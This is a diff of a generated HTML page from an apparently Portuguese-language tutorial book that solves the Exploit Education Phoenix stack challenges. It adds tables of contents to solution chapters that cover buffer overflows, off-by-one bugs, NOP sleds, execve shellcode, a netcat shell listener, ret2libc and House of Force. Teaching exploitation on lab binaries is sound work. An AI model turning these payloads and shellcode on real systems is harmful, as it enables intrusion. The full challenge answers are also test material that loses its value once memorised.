@@ -157,6 +157,36 @@ $ ./boot-exploit-education-phoenix-amd64.sh
 <li>Os arquivos tão em: cd /opt/phoenix/amd64</li>
 </ul>
 <p>Boa Sorte! :D</p>
+<ul>
+<li><a href="print.html#-descri%C3%A7%C3%A3o">📝 Descrição</a></li>
+<li><a href="print.html#-dica">💡 Dica</a></li>
+<li><a href="print.html#conhecimento-preliminar">Conhecimento Preliminar</a>
+<ul>
+<li><a href="print.html#buffer">Buffer</a></li>
+<li><a href="print.html#stack">Stack</a>
+<ul>
+<li><a href="print.html#a-stack-cresce-para-valores-menores">A stack cresce para valores menores</a></li>
+<li><a href="print.html#hex">Hex</a></li>
+<li><a href="print.html#melhorando-o-exemplo-do-po%C3%A7o">Melhorando o exemplo do poço</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="print.html#-explica%C3%A7%C3%A3o">🎉 Explicação</a>
+<ul>
+<li><a href="print.html#-1--alocando-as-vari%C3%A1veis-na-stack-buffer64-changeme">🥞 1- Alocando as variáveis na stack (buffer[64], changeme)</a></li>
+<li><a href="print.html#-2--alterar-buffer64-usando-gets">💥 2- Alterar buffer[64] usando gets</a></li>
+<li><a href="print.html#-3--o-programa-checa-se-changeme-foi-alterada">✅ 3- O programa checa se changeme foi alterada</a>
+<ul>
+<li><a href="print.html#-64-as-changeme-n%C3%A3o-alterado">❌ 64 As, changeme não alterado</a></li>
+<li><a href="print.html#-65-as-changeme-alterado">✅ 65 As, changeme alterado</a></li>
+<li><a href="print.html#%EF%B8%8F-64-as-e-um-b-0x42-aaaaaaaaaaaab">🅱️ 64 As e um B (0x42): AAAAAAAAA.....AAAB</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="print.html#-solu%C3%A7%C3%A3o">👾 Solução</a></li>
+</ul>
 <a class="header" href="print.html#-descrição" id="-descrição"><h1>📝 Descrição</h1></a>
 <p>Esse nível demonstra que memoria pode ser acessada fora da sua região
 inicialmente alocada, como as variáveis são alocadas na stack, e que altera-las pode mudar a execução do programa.</p>
@@ -344,6 +374,21 @@ Welcome to phoenix/stack-zero, brought to you
 by https://exploit.education
 Well done, the 'changeme' variable has been changed!
 </code></pre>
+<ul>
+<li><a href="print.html#-objetivo">🎯 Objetivo</a></li>
+<li><a href="print.html#-dicas">💡 Dicas</a></li>
+<li><a href="print.html#-explica%C3%A7%C3%A3o">💫 Explicação</a>
+<ul>
+<li><a href="print.html#input">Input</a></li>
+<li><a href="print.html#endian">Endian</a>
+<ul>
+<li><a href="print.html#-dica-usando-valores-hex-diretamente">🌙 Dica: Usando valores hex diretamente</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="print.html#-solu%C3%A7%C3%A3o">🔥 Solução</a></li>
+</ul>
 <a class="header" href="print.html#-objetivo" id="-objetivo"><h1>🎯 Objetivo</h1></a>
 <p>Agora o objetivo não é só alterar <code>changeme</code>, é alterar para um valor especifico!</p>
 <p>Lembra aquilo de controlar o valor depois do preenchimento (<code>padding</code>) ?</p>
@@ -450,6 +495,16 @@ Well done, you have successfully set changeme to the correct value
 <blockquote>
 <p>./stack-one $(python -c &quot;print b'A' * 64 + b'bYlI'&quot;)</p>
 </blockquote>
+<ul>
+<li><a href="print.html#-objetivo">🎯 Objetivo</a></li>
+<li><a href="print.html#-explica%C3%A7%C3%A3o">💫 Explicação</a>
+<ul>
+<li><a href="print.html#-environment-variable-vari%C3%A1vel-do-ambiente">🌳 Environment Variable (Variável do ambiente)</a></li>
+<li><a href="print.html#overflow">Overflow</a></li>
+</ul>
+</li>
+<li><a href="print.html#-solu%C3%A7%C3%A3o">🔥 Solução</a></li>
+</ul>
 <a class="header" href="print.html#-objetivo-1" id="-objetivo-1"><h1>🎯 Objetivo</h1></a>
 <p>Similar à anterior, a gente precisa mudar o valor da variável changeme,
 mas dessa vez ao invés de usar o input ou argv, vamos usar env!</p>
@@ -510,6 +565,24 @@ Well done, you have successfully set changeme to the correct value
 <blockquote>
 <p>$ ExploitEducation=$(python -c &quot;print b'A'*64 + b'\x0a\x09\x0a\x0d'&quot;) ./stack-two</p>
 </blockquote>
+<ul>
+<li><a href="print.html#-objetivo">🎯 Objetivo</a></li>
+<li><a href="print.html#-dica">💡 Dica</a></li>
+<li><a href="print.html#-explica%C3%A7%C3%A3o">💫 Explicação</a>
+<ul>
+<li><a href="print.html#%EF%B8%8F%EF%B8%8F-o-que-raios-s%C3%A3o-pointers">↗️↘️ O que raios são pointers</a></li>
+<li><a href="print.html#-function-pointers">🦀 Function Pointers</a></li>
+<li><a href="print.html#-exploit">🔥 Exploit</a>
+<ul>
+<li><a href="print.html#-analisando-o-programa">🛸 Analisando o programa</a></li>
+<li><a href="print.html#-encontrando-o-endere%C3%A7o-da-fun%C3%A7%C3%A3o">🏠 Encontrando o endereço da função</a></li>
+<li><a href="print.html#-cansei-de-teoria-eu-quero-exploit">😐 Cansei de teoria eu quero exploit</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="print.html#-solu%C3%A7%C3%A3o">🔥 Solução</a></li>
+</ul>
 <a class="header" href="print.html#-objetivo-2" id="-objetivo-2"><h1>🎯 Objetivo</h1></a>
 <p>Usar um pointer para retornar para uma função pre existente</p>
 <a class="header" href="print.html#-dica-1" id="-dica-1"><h1>💡 Dica</h1></a>
@@ -673,6 +746,49 @@ Congratulations, you've finished phoenix/stack-three :-) Well done!
 <pre><code>calling function pointer @ 0x40069d
 Congratulations, you've finished phoenix/stack-three :-) Well done!
 </code></pre>
+<ul>
+<li><a href="print.html#-objetivo">🎯 Objetivo</a></li>
+<li><a href="print.html#-conhecimento-preliminar">🛸 Conhecimento preliminar</a>
+<ul>
+<li><a href="print.html#-assembly">🤖 Assembly</a>
+<ul>
+<li><a href="print.html#-register-registos--registadores">📦 Register (Registos / Registadores)</a>
+<ul>
+<li><a href="print.html#-general-purpose-registers-gpr--registo-de-prop%C3%B3sito-geral-">🌍 General Purpose Registers (GPR) ( Registo de Propósito Geral )</a></li>
+<li><a href="print.html#-address-register--armazenam-endere%C3%A7os-da-stack-">💫 Address Register ( armazenam endereços da stack )</a></li>
+<li><a href="print.html#-rflag">🏁 RFLAG</a></li>
+<li><a href="print.html#-ap%C3%AAndice---curiosidade--nomenclatura-hist%C3%B3rica">🧠 Apêndice - Curiosidade : Nomenclatura histórica</a></li>
+</ul>
+</li>
+<li><a href="print.html#-instru%C3%A7%C3%B5es">⚡ Instruções</a></li>
+<li><a href="print.html#-fun%C3%A7%C3%B5es-pr%C3%B3logo-e-ep%C3%ADlogo">🦄 Funções, Prólogo e Epílogo</a>
+<ul>
+<li><a href="print.html#-revis%C3%A3o">☕ Revisão</a></li>
+<li><a href="print.html#%EF%B8%8F-stack-frame--moldura-da-stack-">🖼️ Stack Frame ( Moldura da Stack )</a></li>
+<li><a href="print.html#-pr%C3%B3logo">🔒 Prólogo</a>
+<ul>
+<li><a href="print.html#se-a-fun%C3%A7%C3%A3o-receber-argumentos-salvar-eles">Se a função receber argumentos, salvar eles</a></li>
+</ul>
+</li>
+<li><a href="print.html#salvar-o-frame-atual">Salvar o frame atual</a></li>
+<li><a href="print.html#criar-novo-frame">Criar novo frame</a></li>
+<li><a href="print.html#-ep%C3%ADlogo">🔑 Epílogo</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="print.html#-caso-voc%C3%AA-tenha-viajado-o-que-voc%C3%AA-precisa-saber">🌍 Caso você tenha viajado, o que você precisa saber</a></li>
+<li><a href="print.html#-exploit">🔥 Exploit</a>
+<ul>
+<li><a href="print.html#-analisar-o-programa">🔬 Analisar o programa</a></li>
+<li><a href="print.html#%EF%B8%8F-o-compilador-adicionou-coisa">⁉️ O compilador adicionou coisa???</a></li>
+<li><a href="print.html#-encontrar-endere%C3%A7o-de-complete_level">🏠 Encontrar endereço de complete_level</a></li>
+</ul>
+</li>
+<li><a href="print.html#-solu%C3%A7%C3%A3o">💫 Solução</a></li>
+</ul>
 <a class="header" href="print.html#-objetivo-3" id="-objetivo-3"><h1>🎯 Objetivo</h1></a>
 <p>O buffer overflow (<code>BOF</code>) vai nos permitir alterar o saved return pointer (<code>SRP</code>) e redirecionar a execução do programa.</p>
 <p>Esse desafio está nos preparando para o próximo, no qual nos redirecionaremos a execução para o nosso próprio código, e teremos um exploit de verdade! :D</p>
@@ -1066,6 +1182,30 @@ Welcome to phoenix/stack-four, brought to you by https://exploit.education
 and will be returning to 0x40061d
 Congratulations, you've finished phoenix/stack-four :-) Well done!
 </code></pre>
+<ul>
+<li><a href="print.html#-objetivo">🎯 Objetivo</a></li>
+<li><a href="print.html#-dicas">💡 Dicas</a></li>
+<li><a href="print.html#-exploit">🔥 Exploit</a>
+<ul>
+<li><a href="print.html#analisando-o-programa">Analisando o programa</a></li>
+<li><a href="print.html#agora-em-asm-d-analise-est%C3%A1tica">Agora em ASM :D (analise estática)</a>
+<ul>
+<li><a href="print.html#breakpoint">Breakpoint</a></li>
+</ul>
+</li>
+<li><a href="print.html#agora-vamos-executar-o-programa-analise-din%C3%A2mica">Agora vamos executar o programa (analise dinâmica)</a></li>
+<li><a href="print.html#encontrar-endere%C3%A7o-do-buffer">Encontrar endereço do buffer</a></li>
+<li><a href="print.html#nop-sled">NOP sled</a></li>
+<li><a href="print.html#shellcode">Shellcode</a></li>
+<li><a href="print.html#corrigindo-o-problema">Corrigindo o problema</a>
+<ul>
+<li><a href="print.html#rop-gadgets">ROP Gadgets</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="print.html#-solu%C3%A7%C3%A3o">💫 Solução</a></li>
+</ul>
 <a class="header" href="print.html#-objetivo-4" id="-objetivo-4"><h1>🎯 Objetivo</h1></a>
 <p>Finalmente! Tudo isso para chegar no BOF SRP (clássico) :D</p>
 <p>Agora ta na hora de redirecionar o pointer para o nosso código malicioso (shellcode) para ganhar uma shell</p>
@@ -1388,6 +1528,53 @@ open(&quot;/tmp/exploit&quot;,&quot;wb&quot;).write(buf)
 <p>Terminal 1: <code>nc -lvnp 4444</code></p>
 <p>Terminal 2: <code>cat /tmp/exploit | ./stack-five</code></p>
 <p>Agora, no terminal 1 deve ter uma shell :D</p>
+<ul>
+<li><a href="print.html#-dicas">💡 Dicas</a></li>
+<li><a href="print.html#-explica%C3%A7%C3%A3o">🛸 Explicação</a>
+<ul>
+<li><a href="print.html#analisando-o-programa">Analisando o programa</a>
+<ul>
+<li><a href="print.html#main">main</a>
+<ul>
+<li><a href="print.html#dica">Dica</a></li>
+</ul>
+</li>
+<li><a href="print.html#greet">greet</a></li>
+</ul>
+</li>
+<li><a href="print.html#analisando-o-programa-asm">Analisando o programa (ASM)</a>
+<ul>
+<li><a href="print.html#main-1">main</a></li>
+</ul>
+</li>
+<li><a href="print.html#fuzz">Fuzz</a></li>
+<li><a href="print.html#e-vamos-rodar-com-127-as">E vamos rodar com 127 As:</a>
+<ul>
+<li><a href="print.html#curiosidade">Curiosidade</a></li>
+</ul>
+</li>
+<li><a href="print.html#como-ir-de-off-by-one-para-execu%C3%A7%C3%A3o-de-c%C3%B3digo">Como ir de off-by-one para execução de código</a>
+<ul>
+<li><a href="print.html#ret-com-um-rbp-corrompido">Ret com um RBP corrompido</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="print.html#-exploit">🔥 Exploit</a>
+<ul>
+<li><a href="print.html#o-que-controlamos">O que controlamos?</a>
+<ul>
+<li><a href="print.html#setup">Setup</a></li>
+<li><a href="print.html#descobrir-que-partes-da-memoria-controlamos">Descobrir que partes da memoria controlamos</a></li>
+<li><a href="print.html#encontrar-para-que-regi%C3%A3o-podemos-apontar-rbp">Encontrar para que região podemos apontar rbp</a></li>
+<li><a href="print.html#encontrar-um-pointer-nessa-regi%C3%A3o-que-aponte-para-a-parte-que-controlamos">Encontrar um pointer nessa região que aponte para a parte que controlamos</a></li>
+</ul>
+</li>
+<li><a href="print.html#shellcode">Shellcode</a></li>
+</ul>
+</li>
+<li><a href="print.html#-solu%C3%A7%C3%A3o">💫 Solução</a></li>
+</ul>
 <a class="header" href="print.html#-dicas-2" id="-dicas-2"><h1>💡 Dicas</h1></a>
 <p>Off-by-one BOF</p>
 <a class="header" href="print.html#-explicação-4" id="-explicação-4"><h1>🛸 Explicação</h1></a>
@@ -1860,6 +2047,23 @@ groups=406(phoenix-amd64-stack-six),27(sudo),1000(user)
 <blockquote>
 <p>ExploitEducation=$(python -c &quot;print '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05' + 99 * 'A' + '\xc0'&quot;) /opt/phoenix/amd64/stack-six</p>
 </blockquote>
+<ul>
+<li><a href="print.html#dep--nx--wx">DEP | NX | W^X</a></li>
+<li><a href="print.html#system-aslr">System ASLR</a></li>
+<li><a href="print.html#pie">PIE</a></li>
+<li><a href="print.html#relro">RELRO</a></li>
+<li><a href="print.html#canaries">Canaries</a></li>
+<li><a href="print.html#outras">Outras</a>
+<ul>
+<li><a href="print.html#linux">Linux</a>
+<ul>
+<li><a href="print.html#pointer-guard">Pointer Guard</a></li>
+</ul>
+</li>
+<li><a href="print.html#windows">Windows</a></li>
+</ul>
+</li>
+</ul>
 <a class="header" href="print.html#dep--nx--wx" id="dep--nx--wx"><h1>DEP | NX | W^X</h1></a>
 <p>Todas essas pretendem impedir a execução de código em
 partes da memoria que sejam &quot;escreviveis&quot;.</p>
@@ -1923,6 +2127,28 @@ endereço absoluto.</p>
 <a class="header" href="print.html#linux" id="linux"><h2>Linux</h2></a>
 <a class="header" href="print.html#pointer-guard" id="pointer-guard"><h3>Pointer Guard</h3></a>
 <a class="header" href="print.html#windows" id="windows"><h2>Windows</h2></a>
+<ul>
+<li><a href="print.html#ret2libc">Ret2LibC</a></li>
+<li><a href="print.html#fun%C3%A7%C3%B5es-%C3%BAteis">Funções Úteis</a>
+<ul>
+<li><a href="print.html#system">System()</a>
+<ul>
+<li><a href="print.html#conseguindo-o-pointer-para-binsh">Conseguindo o pointer para /bin/sh</a></li>
+<li><a href="print.html#layout-da-stack-numa-call-32-bits">Layout da stack numa call 32 bits</a></li>
+<li><a href="print.html#unindo-tudo">Unindo tudo</a></li>
+</ul>
+</li>
+<li><a href="print.html#execve--exit">Execve() + Exit()</a></li>
+<li><a href="print.html#mprotect--ret2shellcode-todo">Mprotect() + ret2shellcode (~TODO~)</a></li>
+</ul>
+</li>
+<li><a href="print.html#pontos-fracos">Pontos Fracos</a>
+<ul>
+<li><a href="print.html#estaticamente-linkado">Estaticamente Linkado</a></li>
+<li><a href="print.html#dinamicamente-linkado--aslr">Dinamicamente Linkado (+ ASLR)</a></li>
+</ul>
+</li>
+</ul>
 <a class="header" href="print.html#ret2libc" id="ret2libc"><h1>Ret2LibC</h1></a>
 <p>Ret2Libc foi uma técnica desenvolvida para combater W^X. Alem disso,
 ter domínio dessa técnica facilitar a compreensão de ROP. :D</p>
@@ -2202,6 +2428,13 @@ necessário primeiro encontrar o endereço aleatório do libc (libc-leak), ou
 executar o exploit em loop ate voce dar sorte (viável somente em
 computadores 32 bits).</p>
 <a class="header" href="print.html#house-of-force" id="house-of-force"><h1>House of Force</h1></a>
+<ul>
+<li><a href="print.html#house-of-force">House of Force</a></li>
+<li><a href="print.html#teoria">Teoria</a></li>
+<li><a href="print.html#va-wrap-around">VA Wrap-Around</a></li>
+<li><a href="print.html#limita%C3%A7%C3%B5es">Limitações</a></li>
+<li><a href="print.html#fontes-e-materiais-para-praticar">Fontes e Materiais para praticar</a></li>
+</ul>
 <a class="header" href="print.html#teoria" id="teoria"><h1>Teoria</h1></a>
 <p>A técnica da House Of Force consiste em usar um heap overflow para alterar o
 tamanho do top_chunk para o valor máximo ( 0xffffffffffffffff ) ... permitindo
